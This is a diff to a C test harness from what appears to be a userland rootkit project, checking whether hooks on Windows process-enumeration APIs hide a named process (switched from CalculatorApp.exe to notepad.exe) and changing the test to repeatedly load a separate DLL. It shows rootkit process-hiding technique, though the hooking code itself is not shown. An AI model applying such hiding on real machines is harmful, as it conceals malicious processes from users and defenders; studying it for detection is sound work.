@@ -1,7 +1,7 @@
 #include "rku.h"
 
-unsigned char hide_me[] = "CalculatorApp.exe";
-unsigned short whide_me[] = L"CalculatorApp.exe";
+unsigned char hide_me[] = "notepad.exe";
+unsigned short whide_me[] = L"notepad.exe";
 
 int isCalcPresent_v1(void){
     printf("Testing CreateToolhelp32Snapshot way to enumerate processes\n");
@@ -13,11 +13,11 @@ int isCalcPresent_v1(void){
         do {
             if (!strcmp(pe32.szExeFile, hide_me)){
                 printf("%d %s\n", pe32.th32ProcessID, pe32.szExeFile);
-                printf("We have found the CalculatorApp.exe!\n");
+                printf("We have found the notepad.exe!\n");
                 return 0;
             }
         } while (Process32Next(hSnapshot, &pe32));
-        printf("We have not found the CalculatorApp.exe :(\n");
+        printf("We have not found the notepad.exe :(\n");
         return 1;
     }
     printf("We have failed at creating a snapshot!\n");
@@ -53,10 +53,10 @@ int isCalcPresent_v2(fpNtQuerySystemInformation f){
     }
     HeapFree(GetProcessHeap(), 0, freeme);
     if (flag){
-        printf("We have found the CalculatorApp.exe!\n");
+        printf("We have found the notepad.exe!\n");
         return 0;
     }
-    printf("We have not found the CalculatorApp.exe :(\n");
+    printf("We have not found the notepad.exe :(\n");
     return 1;
 
 }
@@ -114,17 +114,23 @@ int main(){
     fpProcessEnum P32First = (fpProcessEnum)GetProcAddress(k32, "Process32First");
     fpProcessEnum P32Next = (fpProcessEnum)GetProcAddress(k32, "Process32Next");
     fpNtQuerySystemInformation pnt = (fpNtQuerySystemInformation)GetProcAddress(nt, "NtQuerySystemInformation");
-    printf("Installing the hooks\n");
-    InstallHook(P32First, hookProcessEnum, &hFirst);
-    InstallHook(P32Next, hookProcessEnum, &hNext);
-    InstallHook(pnt, hookNt, &hNtQ);
-    isCalcPresent_v1();
-    isCalcPresent_v2(pnt);
-    printf("Removing the hooks\n");
-    RemoveHook(P32First, &hFirst);
-    RemoveHook(P32Next, &hNext);
-    RemoveHook(pnt, &hNtQ);
-    isCalcPresent_v1();
-    isCalcPresent_v2(pnt);
+    // printf("Installing the hooks\n");
+    // InstallHook(P32First, hookProcessEnum, &hFirst);
+    // InstallHook(P32Next, hookProcessEnum, &hNext);
+    // InstallHook(pnt, hookNt, &hNtQ);
+    // isCalcPresent_v1();
+    // isCalcPresent_v2(pnt);
+    // printf("Removing the hooks\n");
+    // RemoveHook(P32First, &hFirst);
+    // RemoveHook(P32Next, &hNext);
+    // RemoveHook(pnt, &hNtQ);
+    // isCalcPresent_v2(pnt);
+    // isCalcPresent_v1();
+    while (1){
+        printf("Trying to check for calc presence\n");
+        LoadLibraryA("C:\\coding\\rootkit-userland\\inf.dll");
+        isCalcPresent_v2(pnt);
+        Sleep(5000);
+    }
     return 0;
 }
